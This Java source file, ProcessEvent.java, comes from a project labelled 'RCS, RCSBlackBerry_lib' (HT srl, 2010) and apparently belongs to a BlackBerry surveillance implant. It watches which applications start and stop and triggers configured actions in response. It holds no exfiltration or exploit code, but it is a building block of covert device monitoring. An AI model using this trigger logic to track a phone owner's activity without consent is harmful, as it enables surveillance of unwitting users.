//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ProcessEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;
import java.util.Vector;

import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.action.Action;
import blackberry.interfaces.ApplicationListObserver;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class ProcessEvent.
 */
public final class ProcessEvent extends Event implements
        ApplicationListObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ProcessEvent", DebugLevel.VERBOSE);
    //#endif

    int actionOnEnter;
    int actionOnExit;

    boolean processType;

    String process;

    /**
     * Instantiates a new process event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public ProcessEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_PROCESS, actionId, confParams);
        setPeriod(NEVER);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        //#ifdef DEBUG_TRACE
        debug.trace("actualRun");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {
        //#ifdef DEBUG_TRACE
        debug.trace("actualStart");
        //#endif
        AppListener.getInstance().addApplicationListObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        //#ifdef DEBUG_TRACE
        debug.trace("actualStop");
        //#endif
        AppListener.getInstance().removeApplicationListObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.ApplicationListObserver#onApplicationListChange
     * (java.util.Vector, java.util.Vector)
     */
    public synchronized void onApplicationListChange(
            final Vector startedListName, final Vector stoppedListName,
            final Vector startedListMod, final Vector stoppedListMod) {

        //#ifdef DEBUG_TRACE
        debug.trace("onApplicationListChange: " + this);
        //#endif

        Vector startedList;
        Vector stoppedList;

        if (processType) {
            //#ifdef DEBUG_TRACE
            debug.trace("onApplicationListChange: PROCESS (mod)");
            //#endif
            startedList = startedListMod;
            stoppedList = stoppedListMod;
        } else {
            //#ifdef DEBUG_TRACE
            debug.trace("onApplicationListChange: WINDOWS (name)");
            //#endif
            startedList = startedListName;
            stoppedList = stoppedListName;
        }

        if (actionOnEnter != Action.ACTION_NULL
                && startedList.contains(process)) {
            //#ifdef DEBUG_INFO
            debug.info("triggering enter: " + process);
            //#endif
            trigger(actionOnEnter);
        }

        if (actionOnExit != Action.ACTION_NULL && stoppedList.contains(process)) {
            //#ifdef DEBUG_INFO
            debug.info("triggering exit: " + process);
            //#endif
            trigger(actionOnExit);
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();

            final int value = databuffer.readInt();
            processType = value == 0; // 0: process, 1: window;

            final int len = databuffer.readInt();

            final byte[] payload = new byte[len];
            databuffer.read(payload);

            process = WChar.getString(payload, true);

            //#ifdef DEBUG_INFO
            debug.info("Process: " + process + " enter:" + actionOnEnter
                    + " exit: " + actionOnExit);
            //#endif

            //#ifdef DBC
            Check.asserts(actionOnEnter >= Action.ACTION_NULL,
                    "negative value Enter");
            Check.asserts(actionOnExit >= Action.ACTION_NULL,
                    "negative value Exit");
            //#endif

        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG
        StringBuffer sb = new StringBuffer();
        sb.append("enter: " + actionOnEnter);
        sb.append(" exit: " + actionOnExit);
        sb.append(" processType: " + processType);
        sb.append(" process: " + process);
        debug.info(sb.toString());
        //#endif

        return true;
    }

}
